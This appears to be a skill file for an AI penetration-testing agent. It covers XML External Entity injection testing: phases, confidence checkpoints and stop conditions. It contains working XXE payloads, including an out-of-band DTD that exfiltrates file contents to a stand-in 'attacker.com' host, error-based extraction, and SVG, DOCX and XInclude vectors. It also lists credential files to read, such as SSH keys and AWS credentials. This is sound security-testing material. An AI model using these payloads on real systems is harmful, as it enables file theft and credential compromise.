---
name: testing-xxe
description: XML External Entity injection testing. Use when the application parses XML input — identified by XML content types (application/xml, text/xml), SOAP endpoints, file uploads accepting XML/SVG/DOCX/XLSX formats, RSS/Atom feed processing, or any functionality processing structured XML data. Covers in-band entity expansion, blind/OOB XXE with parameter entities, error-based extraction, local DTD hijacking, XInclude attacks, and XXE via file upload vectors.
---

# XXE Injection Testing

XXE exploits XML parsers that process external entity declarations in user-controlled XML input. The same mechanism that legitimately loads external resources (entity definitions from external DTDs) can be abused to read local files, make SSRF requests, achieve OOB data exfiltration, and occasionally cause denial of service.

## Reference Files

- [exploitation.md](./exploitation.md) — Exploitation techniques: file targeting, OOB exfiltration, error-based extraction, local DTD hijacking

## Mental Model

XML has a feature called ENTITIES — shortcuts for repeated content:
```xml
<!DOCTYPE example [
  <!ENTITY greeting "Hello, world!">
]>
<message>&greeting;</message>
```
This replaces `&greeting;` with `Hello, world!`.

Entities can reference EXTERNAL resources:
```xml
<!ENTITY ext SYSTEM "file:///etc/passwd">
```
If the parser processes this entity, it opens `/etc/passwd` and substitutes its content.

**The vulnerability:** Most modern parsers disable external entities by DEFAULT. XXE occurs when:
1. The application accepts XML input from users
2. The XML parser has external entities ENABLED (misconfiguration)
3. The parser processes DOCTYPE declarations

**Where XXE hides:** Anywhere XML is processed. Not just `application/xml` — SVG files, DOCX/XLSX/PPTX (which are ZIP archives containing XML), SAML assertions, XMP metadata in PDFs, RSS/Atom feeds, SOAP services, and many more.

## Workflow

```
1. BASELINE → 2. CONFIRMATION → 3. NEGATIVE VERDICT → 4. EXPLOITATION
   (XML behavior)   (entity test)    (declare not vuln)    (file read / SSRF)

   Stop conditions checked at every step ↓
```

---

## Phase 1: Baseline

### Step 1.1: XML Acceptance
Can you send XML? Test:
- Set `Content-Type: application/xml` on endpoints that accept JSON — do they also accept XML?
- SOAP endpoints (explicitly XML-based)
- File uploads accepting XML/SVG/DOCX/XLSX
- RSS/Atom imports
- SAML endpoints

### Step 1.2: Error Message Analysis
Submit malformed XML. Errors reveal:
- Parser name/version (libxml2, Xerces, .NET XmlReader, Java JAXP)
- Line numbers (indicates parser is actually processing)
- Whether DOCTYPE is stripped (if errors mention DOCTYPE, it's being parsed)

### Step 1.3: Internal Entity Test
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY internal "INTERNAL_ENTITY_TEST_12345">
]>
<root>&internal;</root>
```
If `INTERNAL_ENTITY_TEST_12345` appears in the response → entity processing is ENABLED. Critical prerequisite for XXE.

### Reasoning Checkpoint
```
[PHASE-1] Baseline
[ENDPOINT] {URL or file upload}
[XML-ACCEPTED] {yes / no}
[DOCTYPE-ACCEPTED] {yes / stripped}
[INTERNAL-ENTITY] {resolved / not resolved}
[PARSER-INFO] {if revealed}
[DECISION] {Proceed / Entities disabled — STOP}
```

---

## Phase 2: Confirmation

### Confidence Definitions
| Level | For XXE |
|-------|---------|
| HIGH | External entity resolves AND file content/HTTP response appears in output OR OOB callback received |
| MEDIUM | Internal entities resolve but external fails / errors suggest processing |
| LOW | DOCTYPE stripped, entities not resolved |

### Step 2.1: External Entity — File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>
```
Use a small, simple file first (`/etc/hostname` not `/etc/passwd`). If content appears → HIGH confidence.

### Step 2.2: External Entity — SSRF Test `[EXTERNAL INFRA REQUIRED]`
```xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-test-12345">
]>
<root>&xxe;</root>
```
HTTP callback on your server confirms external entity resolution.

### Step 2.3: Blind XXE — Parameter Entities `[EXTERNAL INFRA REQUIRED]`

When the response doesn't reflect entity content:
```xml
<!DOCTYPE test [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

On your server, host `evil.dtd`:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```

The file content is exfiltrated via HTTP request to attacker server.

### Step 2.4: Error-Based Extraction

Force an error containing file content:
```xml
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```
The error message reads: "Cannot open: /nonexistent/ACTUAL_FILE_CONTENT".

### Step 2.5: XXE via SVG Upload

If the app accepts SVG uploads:
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```
If the server renders SVG (e.g., to PNG), the hostname appears in the rendered image.

### Step 2.6: XXE via DOCX/XLSX

DOCX/XLSX are ZIP archives containing XML. Modify the internal XML:
1. Create a legitimate DOCX
2. Unzip it: `unzip file.docx`
3. Edit `word/document.xml` — add DOCTYPE with entity
4. Re-zip: `zip -r malicious.docx *`
5. Upload

### Step 2.7: XInclude Attack (if DOCTYPE blocked)

XInclude doesn't require DOCTYPE but achieves similar file reads:
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</root>
```

**Max confirmation attempts: 10.**

### Reasoning Checkpoint
```
[PHASE-2] Confirmation
[TECHNIQUE] {basic / OOB / error-based / SVG / DOCX / XInclude}
[RESULT] {file content visible / callback received / error with data / nothing}
[CONFIDENCE] {HIGH / MEDIUM / LOW}
[DECISION] {Proceed / Try blind / Negative verdict}
```

---

## Negative Verdict

### True Negative Conditions
- DOCTYPE declarations stripped or not processed
- Internal entities don't resolve
- External entity attempts produce no change, error, or callback
- XInclude attempts fail
- Tested both in-band and OOB techniques

---

## Phase 3: Exploitation

### Level 1: File Read
Read sensitive files:
- Application config: `/var/www/html/config.php`, `.env`, `web.config`
- System: `/etc/passwd`, `/etc/shadow` (usually requires root)
- SSH keys: `/home/*/.ssh/id_rsa`
- Cloud creds: `~/.aws/credentials`

### Level 2: SSRF via XXE
Access cloud metadata or internal services through entity resolution. See [[ssrf]] for internal targets.

**Stop condition:** File read or internal service access → STOP.

---

## Things to Do
- Test internal entities BEFORE external — confirms entity processing is enabled
- Check file upload endpoints for XXE (SVG, DOCX, XLSX, PPTX) even when API endpoints filter it
- Use OOB techniques when responses don't reflect content
- Test XInclude if DOCTYPE is blocked — it achieves similar impact without DOCTYPE

## Things Not to Do
- Do not execute Billion Laughs (exponential entity expansion) in production — it's a DoS attack
- Do not attempt binary file reads — they break XML parsing
- Do not assume XXE is impossible because Content-Type isn't XML — test SVG/DOCX uploads

## Cross-Skill Links
- [[ssrf]] — XXE achieves SSRF-equivalent access via entity resolution
- [[file-upload]] — SVG/DOCX uploads are XXE vectors
- [[path-traversal]] — XXE file read overlaps with LFI
